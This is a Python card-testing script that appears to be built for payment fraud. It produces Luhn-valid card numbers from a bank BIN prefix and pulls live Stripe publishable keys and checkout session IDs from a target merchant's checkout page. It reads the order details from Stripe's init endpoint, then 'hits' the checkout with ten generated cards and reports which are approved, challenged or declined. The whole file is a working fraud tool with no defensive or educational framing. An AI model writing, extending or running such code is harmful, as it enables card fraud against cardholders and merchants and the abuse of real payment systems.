import sys
import json
import asyncio
import aiohttp
from hitter_core import StripeAPIHitter, StripeAPIExtractor

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

def generate_luhn_cards(bin_prefix: str, count: int = 10):
    cards = []
    i = 100
    while len(cards) < count:
        body = f"{bin_prefix}{i:03d}"
        digits = [int(d) for d in body]
        total = 0
        for idx, d in enumerate(reversed(digits)):
            if idx % 2 == 0:
                doubled = d * 2
                total += doubled - 9 if doubled > 9 else doubled
            else:
                total += d
        check_digit = (10 - (total % 10)) % 10
        full_cc = f"{body}{check_digit}"
        cards.append(f"{full_cc}|05|2028|378")
        i += 7
    return cards

from hitter_core import CardGenerator

CARDS = []  # populated dynamically in main

async def run_single_card(url: str, card_str: str, index: int):
    parts = card_str.split("|")
    card_dict = {
        "card": parts[0],
        "mm": parts[1],
        "yy": parts[2],
        "cvv": parts[3]
    }
    
    async with aiohttp.ClientSession() as sess:
        hdr = {"User-Agent": UA, "Accept": "text/html,*/*"}
        async with sess.get(url, headers=hdr, timeout=12) as r:
            html = await r.text()
            final_url = str(r.url)

        cs_live = StripeAPIExtractor.extract_cs_live(final_url, html)
        pk_live = StripeAPIExtractor.extract_pk_live(html)

        hash_info = StripeAPIExtractor.extract_details_from_url_hash(url)
        hash_pk = hash_info.get('pk_key')
        stripe_account = hash_info.get('stripe_account')
        if hash_pk and hash_pk.startswith('pk_live_'):
            pk_live = hash_pk

        if not cs_live or not pk_live:
            print(f"[{index+1}/10] ERROR: Extraction failed cs={bool(cs_live)} pk={bool(pk_live)}")
            return None

        init_json = {}
        if cs_live.startswith('cs_'):
            try:
                init_url = f"https://api.stripe.com/v1/payment_pages/{cs_live}/init"
                init_data = f"key={pk_live}&eid=NA&browser_locale=en-US"
                if stripe_account:
                    init_data += f"&account={stripe_account}"
                hdr_init = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": UA}
                async with sess.post(init_url, data=init_data, headers=hdr_init, timeout=8) as ir:
                    init_json = await ir.json()
                    if not isinstance(init_json, dict):
                        init_json = {}
            except Exception:
                pass

        locked_email = None
        if init_json:
            locked_email = (
                init_json.get('customer_email')
                or init_json.get('prefilled_email')
                or init_json.get('email')
                or (init_json.get('customer') or {}).get('email')
                or (init_json.get('customer_details') or {}).get('email')
            )

        ts = init_json.get('total_summary') if init_json else None
        raw_amount = ts.get('total') if isinstance(ts, dict) else None
        if raw_amount is None and init_json:
            raw_amount = (
                (init_json.get('invoice') or {}).get('amount_due')
                or (init_json.get('payment_intent') or {}).get('amount')
            )

        striker = StripeAPIHitter(
            pk_live=pk_live,
            cs_live=cs_live,
            proxy_data=None,
            raw_amount=raw_amount,
            locked_email=locked_email,
            stripe_account=stripe_account,
            init_json=init_json,
        )

        res = await striker.hit(card_dict, attempt=1, user_id=0)
        
        status_symbol = "APPROVED" if res.get('success') else ("3DS CHALLENGE" if res.get('decline_code') == 'requires_action' else f"DECLINED ({res.get('decline_code')})")
        
        print(f"[{index+1:02d}/10] {card_str} -> {status_symbol} | time={res.get('response_time', 0):.2f}s | merchant={res.get('merchant')} | amount={res.get('amount')}")
        return res

async def main():
    if len(sys.argv) < 2:
        print("Usage: python sweep_runner.py <url> [card_pattern]")
        return
    url = sys.argv[1]
    
    card_pattern = "415464440233xxxxx|05|28|378"
    if len(sys.argv) > 2:
        card_pattern = sys.argv[2]
        
    print(f"=== STARTING 10-CARD SWEEP ===")
    print(f"Target URL: {url[:80]}...")
    print(f"Card Pattern: {card_pattern}\n")
    
    # Generate 10 unique cards matching the requested pattern
    generated_cards = []
    for _ in range(10):
        c_data = CardGenerator.generate(card_pattern)
        if c_data:
            card_str = f"{c_data['card']}|{c_data['month']}|{c_data['year']}|{c_data['cvv']}"
            generated_cards.append(card_str)
            
    results = []
    for idx, card in enumerate(generated_cards):
        res = await run_single_card(url, card, idx)
        results.append(res)
        await asyncio.sleep(1) # clean 1s gap between hits

    print("\n=== SWEEP COMPLETED ===")

if __name__ == '__main__':
    asyncio.run(main())
